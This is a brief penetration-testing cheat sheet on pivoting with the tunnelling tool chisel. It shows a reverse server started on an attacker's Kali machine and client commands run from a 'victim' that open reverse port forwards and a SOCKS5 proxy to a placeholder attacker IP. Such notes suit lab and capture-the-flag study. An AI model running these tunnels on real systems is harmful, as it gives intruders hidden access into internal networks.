- Start server listening on 8000:
	- `./chisel server -p 8000 --reverse`
- From victim:

| Command                                                 | Notes                                                     |
|---------------------------------------------------------|-----------------------------------------------------------|
| `.\chisel client <attacker ip>:<port> R:80:127.0.0.1:80` | Listen on Kali on port 80 and forward traffic to localhost port 80 on the client |
| `.\chisel client <attacker ip>:<port> R:4444:10.10.10.240:80` | Listen on Kali on port 4444 and forward traffic to 10.10.10.240 port 80 |
| `.\chisel client <attacker ip>:<port> R:socks` | Create a SOCKS5 listener on port 1080 on Kali, allowing proxying through the client |

